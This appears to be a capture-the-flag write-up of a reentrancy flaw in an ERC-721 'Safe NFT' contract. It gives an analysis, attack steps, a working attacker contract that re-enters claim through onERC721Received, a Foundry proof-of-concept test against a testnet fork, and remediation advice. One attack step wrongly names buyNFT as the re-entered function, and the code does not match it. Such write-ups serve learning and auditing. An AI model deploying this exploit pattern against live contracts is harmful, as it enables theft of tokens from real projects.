## Safe NFT

### Vulnerability Analysis
Given contract is an ERC-721 token. The contract utilizes the `_safeMint` function to provide its users with tokens.

One aspect of `_safeMint` is that it verifies correct token transfer via calling `onERC721Received` on the token receiver address.
Given that it involves external call to an unknown entity, additional care must be taken.

Looking at the `claim` function we can see that the logic here breaks the "Checks-Effects-Interactions" pattern, which
leads to this function being vulnerable to the Reentrancy attack.

### Attack Steps
1. To exploit the vulnerability we will use dedicated contract
2. Setup attacker contract with some ETH
3. Call `buyNFT` from attacker contract
4. Call `claim`from attacker contract
5. When `onERC721Received` is called by the target, issue another call to `buyNFT`(re-enter the function)
6. After claiming two NFTs, the initial call to `claim` will be completed

### POC

attacker contract - `SafeNFTAttack.sol`
```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

import "./SafeNFT.sol";

contract SafeNFTAttack {
  safeNFT target;

  constructor(address _targetAddress) {
    target = safeNFT(_targetAddress);
  }

  function attack() external {
    target.buyNFT{ value: 0.01 ether }();
    target.claim();
  }

  function onERC721Received(
    address operator,
    address from,
    uint256 tokenId,
    bytes calldata data
  ) external returns (bytes4) {
    if (target.balanceOf(address(this)) < 2) {
      target.claim();
    }

    return this.onERC721Received.selector;
  }
}
```

forge(foundry) test:
```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "./SafeNFT.sol";
import "./SafeNFTAttack.sol";

// For this test we will use a forked environment
contract SafeNFTPOC is Test {
  safeNFT target = safeNFT(0xf0337Cde99638F8087c670c80a57d470134C3AAE);
  SafeNFTAttack attacker = new SafeNFTAttack(0xf0337Cde99638F8087c670c80a57d470134C3AAE);

  function setUp() external {
    vm.deal(address(attacker), 0.01 ether);
  }

  function testExploit() external {
    vm.startPrank(address(attacker));

    attacker.attack();

    require(target.balanceOf(address(attacker)) == 2, "POC: invalid attacker balance");
  }
}
```

Command: `forge test --mc SafeNFTPOC -f $GOERLI_RPC_URL`

### Remediation
1. Use reentrancy guards (e.g. from OpenZeppelin)
2. Stick with the "Check-Effects-Interactions" pattern. Update `canClaim` mapping before issuing the token
